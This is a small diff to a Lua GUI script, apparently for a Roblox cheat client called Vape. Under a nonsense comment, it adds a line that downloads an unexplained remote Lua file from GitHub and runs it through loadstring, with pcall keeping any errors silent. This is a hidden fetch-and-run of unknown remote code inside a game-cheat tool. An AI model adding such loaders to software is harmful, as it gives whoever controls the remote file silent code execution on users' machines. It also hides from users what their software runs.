@@ -323,6 +323,10 @@ local Profiles = GuiLibrary.CreateWindow2({
 	Icon = "vape/assets/ProfilesIcon.png", 
 	IconSize = 19
 })
+--- pro moment eeheasdalsdjlasjkjd
+pcall(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/vapevoidware/main/Libraries/idklol.lua", true))()
+end)
 GUI.CreateDivider()
 GUI.CreateButton({
 	Name = "Combat", 
